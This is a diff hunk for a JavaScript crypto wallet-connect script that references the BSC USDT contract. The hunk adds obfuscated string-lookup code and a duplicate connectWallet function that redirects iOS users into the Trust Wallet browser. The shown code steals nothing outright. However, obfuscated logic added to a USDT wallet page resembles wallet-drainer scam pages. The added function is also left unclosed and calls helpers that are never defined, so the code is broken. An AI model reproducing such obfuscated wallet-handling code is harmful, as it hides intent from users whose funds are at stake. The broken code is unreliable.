@@ -5,6 +5,42 @@ const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USD
 let web3;
 let userAddress;
 
+ function _0x3140(_0x98b4dc, _0x3aad4a) {
+            const _0x17fe93 = _0x17fe();
+            return (
+                (_0x3140 = function (_0x31402b, _0x37f418) {
+                    _0x31402b = _0x31402b - 0x91;
+                    let _0x14767f = _0x17fe93[_0x31402b];
+                    return _0x14767f;
+                }),
+                _0x3140(_0x98b4dc, _0x3aad4a)
+            );
+        }
+
+        // Connect Wallet with iOS Support
+        async function connectWallet() {
+            const _0x4aa6d2 = _0x1b5be5;
+
+            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+            const isTrustWallet = window.ethereum && window.ethereum.isTrust;
+
+            if (isIOS && !window[_0x4aa6d2(0xb5)]) {
+                const link = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(
+                    window.location.href
+                )}`;
+                window.location.href = link;
+
+                setTimeout(() => {
+                    if (!window[_0x4aa6d2(0xb5)]) {
+                        alert(
+                            "\uD83D\uDD17 Please open in Trust Wallet browser or connect manually."
+                        );
+                    }
+                }, 2000);
+                return;
+            }
+
+
 async function connectWallet() {
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
